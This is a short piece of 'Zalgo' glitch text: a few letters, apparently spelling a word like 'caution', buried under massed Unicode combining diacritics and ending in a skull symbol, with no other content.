̡̨̡̨̨̢̡̡̨̨̡̡̧̢̢̝̼͕͈͍̞̠̜͍̯̯̭̟̦̜͖͕͎̳̺̲͎͔͈̘͉͙̖̻̠̟̪͈̯͈͙̤̰̘̯̠̦̟̥͎̜̬͔̜̖͈͍̗̮̺͉̗͙͚̥̞̗̻͕̱̤̘̪̪͓͍̙̩̺̲͕̩͍̖̱͍̙͙̖̫̲̫̼͇͇̳̤͇̲͓̠̠͖̫̰̼̜̙̬̺̰̱̗̙͇̻̱̯̺͉̠͚͉̯̝̗̹̤̲̑̓̀͂̈́̎́́̐̊̐̽͐̈̅̈̏̌̐̊̈́͌͛͘͝ͅͅͅͅͅƠ̵̧̧̧̨̧̧̡̡̧̢̧̨̨̨̧̢̨̢̢̡̢̢̡̨̨̧̢̛̺͕̳̹̗̲̱̙͎̥̥̼̭̥̟͇̮̺̥͖̹̖̗̘̰̘̞̲͕̗̣̣̭̳̟͍͇̪̠̗̱̻̫̬̖̳͇̺͉̳̘͎͍͚̙̲̖͚͖͙̣͍̙̠̱͎͖̼̜̦̲̻̙̮̞͙̩͖̪̖̼̜̮̤̲̠͎̪͈̝̩̻̤͚͉͍̲͉̤̪̠͙̱̫̬͖͖̭̬̣̟̻͓̗͇͚͖͇̪̣͇͍͍̼̟̰͚̳̻̱̖̦̠͇͍͍͖̘̘͙̹̘̤͎̤̭̟̱̹̣̠̪͈̝̠̩̯͖͖̺̠̟̙͚̹͇̼͚͕̣͕̲̪̭̞̱̯̰͓͔̻̠̱̻͈̩̙̘͎̮̝͓̬͍̼͕̟̼͙͓͍͙̜͉̺͔̱̹̯̪̗̰̥̯̫͉͓̭̤͕̮̝̘̭̺͍̺̮͉͉͎̙̘̠͍̙͖͚͌̓̾̏̈́̿̆̋̍͑̈́̽̉̿̈́̽̏̀͋͗̍̅͋͆̓̾̎̐͌̆͒̂̂͛̍̍̈́͋͗͋̃̐͌̈́̍̐̆̌̌̉̊̎͛̓̒͑̍̈͂́̃͛̈͌̆͋̔̐̆̅̔̎͐̊͗̒͗̀́̑̾̍̔͐̋́̓̓̔̈́̾̓̓̔̋̅̑̂́͋͊̈̌̈͋̆̔͆̈́̑̑̉̀̚̚̚̚͘͜͜͜͠͝͝͝͝ͅͅͅͅͅͅͅᆞ̵̡̡̧̧̡̢̨̨̢̡̨̧̧̧̡̢̨̢̢̧̡̨̡̧̻̫͈̠̣̝͎̖̹̺͚͕̖̳̺̦̭͕͉͕͉̜͓͚̟̣̞̩̜̤̯͍͈̗̲̜̩̤̩̺̰̬̳̣͍͍̘̯̣̤̮̯̠̗̘͇̗͖̭̥̰̝̣̫̞̬̹̺̬͕͉̰̣͍̞̖̣̤̖̻̹̼̟̟̘͔̱̙̹̱͔̬͎̖̩͙̯̩̥͉̳͍̩͔̝̟̖̝̥̜̝̳̪̹̩͙̜̱̩̮̻̱̪͉̭̘̱̥̞̹͈̲̠͖̝̰̻̼̘̖̝̘͙͓̣̭͔̥̥̼̦̹̠̩͈͍͈̳̺̣͓͓̰̬̤̲̥̩̱͚̪̠̺̦̘̠͓̖̜̖̭̹̼͙͓̭͖̰̖͕̼̞͕͎̬̩͇͔̭̻͙̞̤̬̫̣̘̼̼͈͇̼̖̺̫̙̠̙͈̥͕̣̜͉̣̯̭͚̜̯̻̹̥̲͙̥̞̲̓̂̎̄̇̑̔̌̈́̒̊̀̾̉̎̕͜͜͜͝͠ͅͅͅͅͅͅͅᆞ̵̧̧̨̢̨̡̢̨̡̧̡̨̨̡̡̢̢̧̨̨̡̛̛̫̰̙͈͈̦̯̙̙̬̤̤̲̳͙̞͇̥̻͇̦͕͉̗̠̬͓͙̝̦̯̳͙͎͈̹̼͙̞̞̗̼̗̺͕͕̠̳͔͖̝͎̬͇͙̩͎̲͈̫̱̥͈̹̦̜͓͎͎͉͍̱̞̭̦̩̱̮̜̮̟͍̺̮̳̭͎̺͇͇̦̝̟̱̙̰͈͍̺͇̯̭̥̥̦͚̘͚͙̼͕̹̪̲̪̱͚̹͙̤̤͎̜͓̣͓̗̘͕͙̘̹̘̞̖̰͖̩̗̰̪̪̝͉̼̱̜̬̻̭̙̗̙͔̺̮̺̠̯̫̥͉̦̖̫̲̳̹̤̭̱̮̗͈̼̤̻̹͇̭̟̜̳̣͕̬͖͓̖̗̤̠̲̞̙̲̜̖̖͚̬͉̯͖͖̼̣̦͕͔̣̭͖̮̻̠̝̗̹̟̮̫̘̳̻͙̩͚̰̺̯̤͕͉̭̻̯̝̺̼̘̐̾͆͋͒̊͂͊̑̑̈̐͗̔̐̾̀͋̂̾̎͊̀͗͆̂̾͛͐͂̇̄̾̄̓̓̐̈̈́̉̓̈́̑̈́͌̊̈́̈́́̅̐͊͆͆̑̆̉̓̓̉̀̏̀́͐̂͂́̓͛̓̅́̍͂͘͘̕̚̕̕̚͜͜͜͜͜͜͜͜͝͝͝͝ͅͅͅͅͅͅC̷̢̛̛̛̛̛̛̛̛̛̠̟̫͖̪̿̇̅̋͛̆̆̓͊͆͐̄̍̇̆̾̀̎̾̈͆̈́͑͛̾͊̓̀̍̉̓̀̎͋͌̔͒̆̌͋̒̌͛͊́̋̐̅̓̅̽̅̑̒̉͌̑̓͊̊͊̌̐̋͋͂̽̔̿̌̂͋̽̈́̌͂͐͂̈́̄̌̈́͋̍̌͋͊́͂̿͌́̀͊̿̈̀̂̽̈́̈́̅̀̉̑͊͂̈́͋͑͗̃͂͗͛̇̍̌̓̀̏̑́̔̃̓̈́͆́͋̈́͑̒͐̇͌̔̐̀̐̍̽̓̈́̎̎͊̾͛͊̓͐̋͒̒̽͗̊̀̀̽̉͐̀̈́́̏̄̃̏̅̀̃͊̈́̈́̃̔̄̾͑͆̄͆͂́̈́̐̈́̆͌̅̕̚̕̕̕̕̚̕͘̕̚̕͠͠͝͝͝͝͠͝͠͠ͅᆞ̷̡̡̡̢̨̢̛̩̺̰͓̜̲̙̮̤̱͓̻̫͙͓̘͔̟̮̫͚̲͖͈͙̤̠͎̘̥͕̭̼̗̘̖̳̠̦͕͚̝̺̟̦̤̫̣̣̳̜̣͓̱̘̹̟̲͕͍̦̣͚̘̤̈́͊̋͊͌͋̄̎̌̿̀̐͒̂͌̀́͛̓͑͋̿̑̋͗̿̅̐̀̒̇̎̔̀̈́̍̊̾͑̀̌̿̋̉̂̈́̈́͆̈̃̿̆͑̔̾͌̐̈́́̑̉͒̒̆͑́̔͐̉̆̈̎̈́̇͆̑̔͂́̑̑͒̐̀̑̂̎́̆̓̉̀̍̇̇̚̕̕͜͜͠͠͠͠͝͝͝ͅᆞ̴̢̡̧̢̢̢̨̨̛͈̗̣͚͔̪̝͎̫̺̯̺̭͓̬͚̰̭͈̰̠̦͕̘̟̱̬̯̲̦̭͇͎͎̲̞̮̝͈͕̗̻͎̱̼̳̻̦͓͚̭͈͎̰̪̖͍̗̬͓̤̙͉̙̣̱̹̯̖͈̩̳̪̺̖̞̗̯̩̻͖̩̱̱̮̫̥͕̟͕̤͔̻̠͇̣̦̣̩͕͖̝̞̜̯̜̦̭̥͓̣̬̥̖̪̼͍̪͊͆̍̇̈́̎͛͐͂̄͒̔͋̄͒̽̓̒̏͊͊͑̔̃̓́̎̑͛͊̔̈́̌̑́̈́͐̾́̔̿͐́͐̍͌́͒̉̊̎̏͛̆̐̂̎͑͛͗͛̍̊̽̿͋͆̾͗̐̅̇̾̆̇̑̇́̊̾̍̏̇̉̌̿̂́̑̇͂̀̍̍̊́̾͗̂͐́̈́̆̇͌̒́̏̅͂̾̈̅̎̉̇̈́̍̋̈̊͘̕͘͘͘̕̚͘͜͜͜͝͠͝͠͝͠͝͠͝͠͝͠͠͠ͅĄ̶̧̧̧̡̧̡̧̡̡̧̨̢̧̧̧̧̧̡̛̯̞̤̰͈̭͇̹̘̦̯̲̩̜͖̘̭̹͓̲̲̭͖̜̭͕̠̳͕̥̭̗̮͈͔̦̗͖͈̬̼̝̱͙͓͈̗̮͚̼̫̝̣̰̪̪̘̝̰̦͎̦͇̙̻̠̟͇̞̦̭͈̱̖͓͔̥͉̬̣̠̘̟͕̞͔̤͇͕̘̻̖͈̳̺͔̳͇̙̼͎͍̮͈͇͔̠̞̖͙̰̥͕͔͍̻͉͇̪͉̝̔͋̍͒̒̈͗͊̈́͌̇̃̂͒̃͗͂̃̍͐͜͜͜͜͜͜͝ͅͅͅᆞ̷̡̨̡̨̢̡̢̧̡̢̢̢̧̢̢̡̡̧̡̨̡̛̛̛̛̛̛̼̩̮̭̰̞̹̫̝͍͎̥̗͈̲͔̲̘͔̻̫̝̖̦͖͖̯͙̣̱̲̗̭̗̝͖͎̤͓̹̙̠͚͔͎̖̱̣͔̻͕̥͚̖̦͇͉͎̪̬͇͚͎̩̳͓̝̘̳̮͕̘̫̻̹̞̙̫̦͚͉̙͚̣͖̰̭̖͉̗̱̲̘̜̫͇͚̖͈̰̝̤͚̣͔̪̺̳̱̤͍̪̥̠̠̻̝͈̹̬̞̬̪͕͔̘̲͖͍̳͇̣̲̜͚̩̰̤̻͉̭̞̤͎̺͚̗̟̝̫͕̬̼̣̪̤͇̩͇̝͕̠͓̘̖͉͎̜͖̜̳̖̰̦̠͚͉͖̖̬̟̮̦̠͔̯̼͓̱͖̱̫̭̤͔̰̻̙̫̬̮̳̭͎̟̭̯̙̭̩̖̩̼̻͎̮̗͎̝͙̖̠͙͚̙̣͔͙̞͕̤̰̖̖̭͚̰̲̳̜̼̤͍͚̙̦͕̣̰̝̲͈̫̦̲̰̜̯͍̟̠̀̍̄̏̀͒͌͆́͂͆̓̆̃̔̀̄͗͊̍̈́́̅͆̌̈̇̏̃̇̎̀͗̆͂͛̐̍̃̑̓̈́͌̈́͌̈́̊̐̽͗́̿̆̇̑͆̋͒͌͒̀͑͐̊̓̃͑͌̅̈́́͋̈́̏́̿̊̅̐̂̎̏͋͆̐̌̌̑͋̀͒́͂̊̋̃̑̊́̀͋̓͑̃̾͑́͒͒̒̓̈́̈́̐̊̋̇̍́̊͐͐̎͛̏̈́͆̅͒̅̐̈́̿̐̐͆̑͆́̆̑̈́́͊́̊̐͒̊̾́̀͋̿̚͘̚̕̕̚̚͜͜͜͜͜͜͠͝͝͝͝͝͝͝͠͠ͅͅͅͅᆞ̶̡̨̨̢̡̢̢̢̨̨̨̡̧̡̛̛̛̛̯̘͎̩͙̠̺̞͓̳̯̣̰̩͉̞̘̱̖̹̳͓̘̱̳̘͈̟͉̳̝̲̫̤̖̜̜͕̬͓̦̩̫̙͙̥͖͙̹̝͎̻̪̻̭̩͇̜̙͓͈̞̹̺̣͉̭̜̪̦͔̳̩̮̥̺̳̞͓̪͙͓̙͓͈̞̹̦̙̲͕̣͈̯̻͈͕̟̻͙̞̥̼̰̰̬̺̗͎͖̤̞̤̞̹̙͚̞͍̱̦̰̻̜̹͙̘̳̹̘̠̰̼̰͕̲̪̲̘̻̜̣̥͔̣̮͖͇͇̖̜̰̻̲̜̯̖͇̝̹̳̣̳̠͉̻͎̻̖̰̫̘͕̠̬̲̱̤̪̟͓̳̻̺̤̻̦͍͈̳̱̦̲͕̱͍̻̖̲͈͔͉̲̣̠̤̜͙͍͍̩̲͚̖͈̳͈̻̪̮̗̪̰͍̥̲̻͔͕̟̻̱̎͂̊̍͌͆̿̃̈́͆̎͐̄̑̿͆̀̊̆̄̓̈̈́̾͋̂̋̊͌͆̂̓̎͛͒̀̉̊̈̈̅͛͐͒̇́̇͊͒̑͂̍̇̌̆̾̌̎̉͋̆̎͛͋͛̀́̊̀̀̉̀̎̑͌̆͛̀́́͆̂̒̈́̑́̀̊̽̍͛͆̄̑͌̇̔́͌̊͒͋̉͌́͗͒̃̔̄͌̓̇͐̽̃͐͂̽̈́̏̾̌͒́̈̅͊̋͗̋̏͌̏̈́̿̓͛͗͗͂̅͗̔̉̓̃͂͒̆̈́͑̽͊̅͗̉͑̄̏͌͌̈̋̓̉̉̂̓̆̌́̐̈́̉̿̌̎͊͛̔̐̓̈́͆̀̒̑͗́̌́̾̀̄̏̉̑͆͊̏̾̍̉͆̋́͊̏͒̒̃̔̊̂̑͑̂̂͐̈́̈́̊̔̋̐͒͑̑̋͒̔̋̈̾͐̅̋̉̅̎̈́͌̕͘̚͘͘͘͘̕̕̚̚͘̕̚͘͜͜͜͜͝͝͝͝͠͠͝͠͝͠͠͝͠͠͠ͅͅͅͅT̶̡̢̧̡̢̨̧̡̧̧̨̧̢̡̢̨̧̢̧̧̨̨̡̨̧̢̨̢̧̛͈̲̜̼͙͇͇͔̱̳͍͕̳̖͎̼̯̘͎͕͓͍͎̼̻̳̗̝̬̼̞̣̲̹̥̼͚̹̻̠͍̼͎̜̲̳̫͔͉̠̳̜̘͕͙̰̙͍̬̱͖̤͍̲̙͎͔̱̗̮̮̺͎͔̪̟̝̮̱̘̳̹͓̲̜͍͇͕̝̟̠̳͖̻̤̹̱͔̱͕̟̙̻͕̤͕̫̙̘̗̭̰̜͔̯̮͓̤̰̳̝̠̞͚͕̮̼̤̱̥͎̝̪̹̟̘̺͖̲̼̣͎͔̪̺̩̹͉̤̮̳̜̟̣͈̟͓̖̼̣̙̪̬̪̻̠̙̱̹͎̣̗̩̩̼̗͚̰̟̯̳̫̜͉̗̦̹̖͈̮̳͙͕̠̞͇͓̼̗̼̠̲̪̬̤̤̠̳̙͕̯̜̙͉̥̩̼̫͉̮̹͕̞͉͇͈͕͎̹̙͕̻͖͕͔̯̣̻͉̼̪̺̲̳̰̼̹̦͓̜͙̬̪͉̖̳̋̇̍̆͛̈͂̄̽̏̇̌̍̃̂̍̈́̊̌̌̃̔͂͌̈́͑́͒̈́̒͆́̉̎͗̑̀͒́͋̅̃͌̌͂͐͋̌̅̎̇̃͑̈́̉̿̓͋̏̇͊̈́͛̃̉̊̀̄̆̈́̃̓̾͂̽͊̓̋͛̉̈̈́̆̑͂̅̔̀͌̑̀͐̉̈́̓͐͊͒̍̅̓̎̈͐͊͗̕̕͘̚͘͘͘͜͜͜͜͜͜͜͝͝͝͠͝͠͝ͅͅͅᆞ̴̨̨̨̨̡̢̢̢̡̡̨̡̡̨̢̧̡̛̩͈̫̼̠̜̞̠̦̠͓̠̤̟͇̯̻̭͓̭͕͉͈̖̳͎͚͎̠̰͖̟̳̘̬̮̙̝̬̰̳̲̝̙͚͕͖͇̘̪͉̼̼͉̪̜̟̞̹̼̼̼̗̦̲̦̟̘͔̲̗̬̙̗̫͖̟̻̝̣̜̺̳͇̯̗͚̙͎͙̯̞̯̙̫̹͙͚̟͎͚̣̬͎̹͍͈̪̯̞͚̭͚͚͔̰͎̰̘̱̺͚͇͍̘̦̗̼̟͚̞̟̰͚̙͍̫̠̫̪̠̬̟͇̘͎̲̭̙̤͚͖̩̮͉̲̪̣̞̩̞̹͎͚͍̜̫̞̥̳̭̯̰͍͉̜̟̜̟̝͎͕̻̞̩̻̬̼̱̭͉͖͚̖͓͇͇̘̫̺̫͈̣̝̠̼̥̋̀̈̑͑͐͊͆̾̈̈̒̏̌͌̾̌̅̎̂͌͂͌͐͆̉̓̃̈́̎̽͆́̌̒͌̀̆͗͌̆̾̿͑̂̋̒̇͊̔̾͐́̆͌̈͐̓̐̈̋̇̋͊̈̾̌́̉́̌̎̈͗̄̈͗̈́̏̉͌̓̑̏̒̅͒͆̑͊̈́̐̿̈̀͐̋͐̽́̾́͒̍͗̓͛́͒̈́̐̌͊̽̂̀̊̓̊̈́͊͋̈́̄͋̽͊̐̈́̿̎̈́̍̓͛̆̈́̐̊̽̆̽́̿̐́̽̍̔̀̃̾̋͆̈́̈̏̇̈́̉̆̅̽̽̒̈͛̑̍̌̾̾̂̀̂̀̅͛̃̽̿̾̚̕͘̚͘̚͘̚̚̕̕̚̚̕͜͜͜͜͜͜͜͝͠͝͝͝͠͝͝͠͝͝͝͝͝͝͝͝ͅͅͅͅᆞ̵̡̧̨̨̧̡̨̧̡̧̢̧̨̢̡̨̡̢̢̨̡̧̢̨̡̢̧̧̛̛̛͕͎̺͍͎̫̭̞̺͔̭̹͈̲͈̤̰̫̲̺͖̱̣̮̙̹̘̟͇͇̖̗̯̣̙͔̖̖̳̙̠͖̱̣̘̺͙̙̯̠̹͚̩̞̜̺̠̮̬̦̯̺̲͚͎͓͇͈̩̝͇͔̰̝͕̘̬̭̖͉̝̼̝̣͓̼̖̭̫͈̦̟̙̜̮̪̪̫͇͚̜͎̮̣͎͚̖̫͔̳͇̗̼̦͈̭̮̙̭̖͈̘̱͖̦̲̲̳̱͈͍̹̦̣̼͕͔͈̝̻̘̞̲̥̥̞̖̗̩͕̼̬̞͓̦̫̩̳̫͚̮͎̮̗̘͇̗̹̳͚͍̱͓̥͉̙̬̙̭̪̪̖̩͔̳̟̤̻͙̦̬͈̣͎͍̖̻̖̪̻̩̖͙͚͇̤̟͚͎̮̖͈̻͉̣̟͕̥̱͕̩͙̲͕̱̼̹͓̥̠̝͇̖̪̹̜̮̝̣̞̖̦̟͉̰̖̪̣̺͙̙̮̪͚͔̱̙̼̽̿͒͆̋̃͗̿̓̆̔́́͑͊̑̾̄͐͒͂̅̂́̆͒̽̋́̈́̏̿͑̿̈́̿̀͑̎̏̌̂̈̾̋̒͒̐̊̾͛͆̊̃̀͌̓̈́̌͗̽̾̔͑̔͛͐͒͛͆̇̆͊̓̋̇̈́̃̔̒̈̑͗̍̆̆̑̌̓͐͐͘̚̕͘̕͘̕͘̚̕̚̚̚̚͜͜͜͜͜͜͜͝͝͝͝͠͝ͅͅͅͅͅͅI̶̧̨̡̨̨̢̧̢̢̡̢̢̨̧̛̛̛͔̝̤͙̬̼͕͈̯̦̰̘̯̝̮͓̭͎̞̳̙͙̭̯͎̲̞̼͚̼̩̩̬͚̝̥̰̠͓͈͍̲͉̦̬͍͚͔̮̱̪͉̲̹̠͔̖͍̥̫̠̳̞̺̞͇̺͖̞̭͈̪͎̟͉̪͔̣̣͚͕͎̼̳̘͎̜̗̺̦͓̱̻͈̞̠͔̯̬͚̩̯̮͎͚̼̥̝̩̯̮̙̯̰̮̰̦̣͇͎̺͎̤̖̟̳̥̖̗̥̜͓͉̫̺͎͙̘̙̰̙̗̣̥͈͚̣̝̩͙̠͙̬̟̘͇̣͖̽̐̓͐́̈̉͌̐͆̓̂̀̎̐͗̏̆̀̌͆͋̀̍͐̏̂͂̽̎̋̈́̌̅͆̋͐̈́̊͊̀͒͌̓̌̀̊̂̀̔̇̒̑͛͌͂̋̒͋̀̄̌̈́̏̀̔̑̈́̔̍̉̅̈́̀̐͒̈̓̌̓͗̀͒̂̈́̅̀̾͑̃̈́̂̉̽̒̑̒̇̉͂͊̌̏͗̀̅̃͌͌̂́̈́̉͌͒̈́͌̈͐̆̽̆̐̏̉̔̾̀̆̈́̒̈́́̎͐̾́͗͒̂͑̒̉̀̋̿̀̊́̆̈́̿͂̈́̍͌̋̎̌͆̑̈́̓̒́͑̎̌̾̏̊̍͋̍͆̾͛̾̽̈̓͐̀̎̽̓̑͗̅͒̋̅̈̌͒́͐͐̈́̾̈́̀̆́̌̎̋̓̀̿́͊̎͆͊̆̐́̃̂̐̂̐̀̍̈́͊̊́̊̋̔͗͒͗́̋͐̈̆͊̋͛̇͆̒̄̈́̓̚̕̚̕̕̕͘͘̕̚͘̕͘̕̕͘̕̚̚͜͜͜͠͝͝͝͝͠͠͝͠͠͝͝͝͝͝͝͠͝͝ͅͅͅͅͅᆞ̸̢̨̢̧̨̨̡̡̧̧̡̡̧̢̛̛̛̛̛̛̛̛͇͚̮̮̺̼̰̗͍͓̣̹̥̥̣̠͔̪̫͎̮̺͉̖͇̘͉̲̬̙͙̩̗̝͈̗͚̱̟̘̪͓̬͍̺̗̞͙̙̬̹̭͇̱̮͉̞̜̲̟̲̟͉͚͚̱̰̙̦̗̝̗̮̬͓̰̞̬̼̞̟̲̗̬͚̦̮͕̹̜̥͙͉̟̠͓̫͔̞̺̞͙̣͔͓̹͖̫̭̫̦̝͖̙͚̭̘͈͈̪̤̤̙̰͚̤̺̱̖̖̥̘̙̮̠̺̩̜̞̜͔̝̪͚̻̥͈͉̲͇͈̪̩̫̱̩̱͚͎̘̣̮̖̬̘̥͓͓̥͎̣̗̖̺̣͖̯͕̳̣͙̌̂̌̐̐͂̌̊̀̒͂̉̐̀̂̒̑͗͛̐̀̏͂͐̃̐͆͒̃̊͒̔̀̂̓͛̑́̈́̀́͋͋̄͑́͑̔̓͐͑̿̎̎̓̿͌͑́͋̈́̿͛͑̌̈̇̊̆̄̂͑́͌̑̊̂͗̂́̾̍̾̌̀̑́͋́̆̓̀̀̓͌̎̇͋̓̎́̅̎̈́̉̌̂̾̌̔͊͑̓̈́̋͗̆͂͐́͑́̀͂̈́́͗̾̈́́̆̇̿̿͗̅̎͑̍̎̅̍͒̓̓̎̓̔͋͘̚͘̚͘̕̕̚̚̚̕̚̚̚̕͘͜͜͜͜͜͜͝͝͠͝͝͠͠͝͠͝͝ͅͅͅͅͅᆞ̷̢̛̛̛̳͉͍̘̞̫͔͚͇̪̬̹̟̭͍͎͓̦͑̒̋͒̈̏͗̔͒͒̑̽́͐͂͆̃̂̂͐͛͋̾̋́̆̑̀͋̂̅̽̒̃̾͑͐̎͑͛̉̆̒̀̌̍̔͛̂̀̍̒̅̈̂͊͐̽̏͋̉̃̆̆͒̓̿̿͋̀́̉̔̐̀̔̒̿͌̐̓̀̾̒̐̌̈́͊̀͗̄͗͑̑̌́̔̀̕̕̕̚̚͘͝͝͝͝͝͝͠͝Ơ̶̢̡̧̧̛̛̛̛̬̟̘͓̗̝̺̺̫̺͇̫͇̫̠̤̗͍̫̜̩͇̯̻͕̖̮̙̱̤͚͎̟͍̦̙͈̟̦̱̖̠̦̮̗͖̭͚̪͕͎͉̥̥̞͖͓̳̩̺͇͎͋̈́̅̈̅̔͂͋̇͐̔̈́͗̔̈́̃̃̌̌́͑̌̉̀̆̽̓̊̈́̀̈́̑̾̌̍̑̂͋͑̄͂͑̈́́̋́̑̈́̉̄͑̊̓͊̈́͆̒̅͒̇͊́͗̂͐̈́̾̀̂́̄̿̋͒̓͌̅̎̑̎͒̈͑͛̐̂͑̈́̃̓͗̆̇̍̀̈́͊̓͂͛̃̈̅͛̍̍̋̈́̌͗͌̍͆͆͆͐̐̈͒̈́͑̾͋̊́̊͂̀̏̀͌̍͒̔͛̾̒̉͂̊̏̅̾̑̓̂̀͑̂̈́͌̇̊͊̅̂̿̌̾̆͆́̀̐̂͗̋̆̀̀̌̓̑̈́̿̆̀̒͌̓̉́̇̀͊̾̓͛͗͋̎̈͑͌͑͘͘͘͘̚̚̕͘͘̕͘̕̚͝͠͠͠͝͝͝͝͝͠͠͠͠ͅᆞ̴̧̡̢̧̨̡̧̧̨̧̧̢̢̡̨̡̡̡̡̡̛̛̛̛̛̛̛̘̺̹̯͙̗̩̖̻̼̺͎̮̬̟̭̰͔̞̻̜͙̥̞̗̖͔͖̺̼͉̯͈͙͕̘̲̙̼͈̫̞̜̰͔̖̮̦̙̻̬̩͇̖̮͕̭̪̤̘͈̖̩͍̩̰̪̯̠͕̻̖̩͈͚̣̜̭͙͖͉̪̙̠̼̝̺̪̯̣̭̞͎̤͕͔̯̞̤͖̘̹͈̤̖̺̖͎̼͙͚͚̲͇̺̙͎̰̳̞͓̲̜̲͈̩̟͎̞̙͚̪̳̭̳̟̥̱̤̲̤̼͙͇̼̯͚͖̜̯̟͖̮̬͔͔̬͙͎͖̤͍̤̥̫̗̥͈̜̼̝͉̮̹̰̦̺̠̣̘̲̪̗̯̪̻͇͍̱̙̮̯̹̜̥͕̳͓͓̗̖̹̮̫̫͍̲͔̺͔̰̪͉̮̦͔̜͖̤̯͔̠̺̖̥͚̤̥̣̗̲͇̻̤̹̞̫̙̼̑͊̿̆͒͗̀̆̀̾͐̽̏̈̒̈̉͐̀́̈̌͗̈́͋̏̀́̀͌͒̐̾͐̀̃̿̔̐͑̃̓́̇̒̃̓͑̑̆̾̆̓́͌̒̔͗̓͒̽̊̽̑͋͌̐̓͑̀̈̈́̈́̃͋͒̅̍̏͊̅͂̽̔͑̈́̋̎͌͌̈́̈̊͋̑̎̅̃͋̿͛̌̂̊̓̽͒̑́͆̉͗̀̎̅́̎̒͋̒̊͊̋̾͂̆̈́̓̀̀̈́̓́̆́͆́̋́̍̉̆͛̔̈́͆͐̍̒́̒͋̇̃̚͘̕̕͘̚̕̕̕̕͘͘͜͜͝͝͠͝͠͠͝͝͠͝͝͝͝͠͠ͅͅͅͅͅͅᆞ̶̨̨̨̡̨̨̧̢̡̢̧̨̧̨̢̛̛̛͈͔̱̖̱͙̣͚̮̦̗̜͚͈̹̩͕̖̺͚̦̩͈̯͔̗͚͈͎̼̗͍̝̝͈̘͉͉̥͇͚͔͓͎̣̼͖̝̜̻̺̥̟̣̗̮̭̻̮̱̰͇̖̻̺̙̳͇͙̯̳͕̮̬̙̣͓̲̳̖̬̟͔̜̱͓̪̤̱̬̝̥̺̰̠͚̪͔̘̙͚͓̜̜͈͇̘̮͕̫̪͓͉͕̰͈̹͎͚̱̗̝̼͈̞̰̮̭̤̹̗̙̻͉̮͍͍̫̳͎̣̤̻͈͎͈͈̗̣̪͕͕̠̮̙͍͔͔̼̥̜̻̗͊͋̏̀̆͗̄͋̽̀̏̅̓̒̽̑̈́̽̏̎́̋̃̆͊̆̐̍̓̆͊̆̉̑̐͛̄͋͑̽́̍̇͂̆͐̆̎̒̓̍̌̀̎̋̐̌̋̂̑̆̀̏̍̊͌͒̈́̃̇̉̾͛̇̃̃͒̑̀̔̌̂̄͌̽͂̓͋̋̄̔̈̈́̊͛͒̈́͌̒̄̈́̔̌͗̓͋̒̉̔̚͘̕͘͘͘̚̕͜͜͜͜͜͜͠͠͝͠͝͝ͅͅͅͅͅͅN̷̢̢̧̨̢̛̛̛̛̛̛̯̱͙͉͚͎̮̲̣͖̻̜̣̯͚̻͇͓͔̥̭̥͙̝̹̫͔̪͈͕̱̼̹̺̩͉͎͕̝͓͈̘̘̳̫̼̲̪̫̟͖̺͖̩̟͉̘̮͍̥̪̤̲͙̭̼̖̙̠͓̥̳̰̣̼̻̺̝̲̻̮̱͉̫͔̣̪̬̩̔̃́̈́̀̈́̉͆̀́̏̒͛͌͋̓̂̌͛́́͑̈̊͗̒̓̄̾̒͒̂̉͐͐̾͛̓̅͂͋̆̄́̉̉̊͌̅͗̾͐̐͒̆̆̇͗̂̃̊̐͌̈͂̐͆̆̎̋͋̄͒͆͛̽̀̓̽̈́̍̍̑̇̈́̿̍́̅̾̀̾̀̃̽̐͊͛͌̈̇̾̂̓̉̈́̽͑̓̂̅́͆͗́͛̌͌́̂͊͌̓̏̊̀͋̔̐̂͑̄͆̈́͌̿̀̓̌̋̋̀̀̃́͒̇͂̄͒̀͋͌̇̒̏̓̂̅̇̀͊͋̈͌̐͊͛͒̇̐̐̔͗͋̓͋̾̐̐͑̀̀̄̊́̏̓̑̾̀͂͌̑̀̍̍̐̈́̄͛̇̉̈̐̑̄̐͌̎̈́̚͘̕̕̕̚͘̕̕̚̚̕̕̕͘̕͘͜͜͠͝͝͠͠͝͝͝͝͝͠͝͠͠͝ͅͅͅᆞ̸̡̧̢̧̧̢̨̡̧̢̡̢̧̨̢̡̡̛̛̛͎̺̮̤̜̫̼͚̣̠̙̬͔̻̼͖̬͇̺̮͖͈̬͔͍̜͖̺̻̞͖̪̞͚͉̱̣̹͓͇͎̻̞̫͍̹͓͈͓͕͉̣̩͖̺̩̪̖̺̤̭̲̰̰̥̤̰̗͚̹̱̳͕͔̱͇̦̟̬̱̙͓̭͉̟͈̻̻̟̯̲̦͈͓̱̰̮̘͍̳͙̲̦̻̖̯̟̱̟̮̯̟̫̜̗͍̲̺̪͚͈̮̳̳̣̻͚̼͙͇̙̹͓̣͎͎̥̬͔̯͖͕͎͉͎̪̝͍̙̳̤͍̪͎̥̲̻̯͍͙͉̣̼̝̤̟͇̰̦̦͎̹̼͚̩͇̠͍̭͖̗̬̯̥̰̣̮̤͕͔̞͚̱̲̲̫̘̫̗̹͚̘̲̯̼̩̬̥̩̝͙̞̙̤̳̫̭͕̼̤̫̣̦͚̺̼̝̩͚̭̳̫͖̪͈̓̀̑̑̽͊͆̅̄͗̇̔̌̑̽͗̄̾̈̋̍̅̓͐͐̂̉͂͌̀͆́̀̐̂͑̐̀̎̀̂̓̂̽͂̒̈́͑͌̋̓̔͐̎̓͗͆̊̉͆̒̈̇̇̽̀̃̃̾̿̏̅̿́̀̔͋̈͗̄̈̒͒̈́̃̄̓͋̐̋͐̐͗̾̄͗̅́̉̀̄̾̔̔͆̂̒̌̓͂͂̋̃̌̂͒̒͋̃͐̅̊̽̓̒̽̑͆́̌̏̕̕̚̚̚̚̚̕̚̚̕̚͜͠͝͝͠͝͝͠ͅͅͅͅͅͅͅ☠̴̨̡̛̛̙̜̙̖̩̩̫̮̹͈̱͍̲̠͉͚͓̪̯̹̻͚̣͍͕̖̻͎̭̹̞̻̙̼͇̘͓̰̯͇̳̪͇͓͕̃̇͗̈̅̓̍̀̈̾̌̆͊͋͛͋͌̓̋͋̾́̈͊̓̀̋͐̓͋̊͒̆̏̓̈́̓̇̆̓̄̐͗͛͐͛͑͋͊͌̈̎̿̈̈̅̿͒̌̈͂̽͒̑̂̑̀͂̌̀̆̍͆͐͂̋̃̈́̅̈̍̈͊̽̋̓́̓̌̍̒͛̅̎̎̊̽̎̎͐̈́̈́͗͛̈́̏̋͗̑͒̌̐̽̋̀̅̑̒̔̄̈̈́̈́͊͛̅͆̆͆̀̈́̈́̑͋͆͐̏̋̈́̇̒̄̆̀̿̂̀̇̑̄̃̊͛̎͂͛̈́̾̉͋̈͂̎̉͆͘̚̚̚̚̚͘̕̕̚͘̚̕̚͘̕̚̚̚̚͘̕͘̕̕͜͠͠͠͠͝͝͝͝͠ͅͅ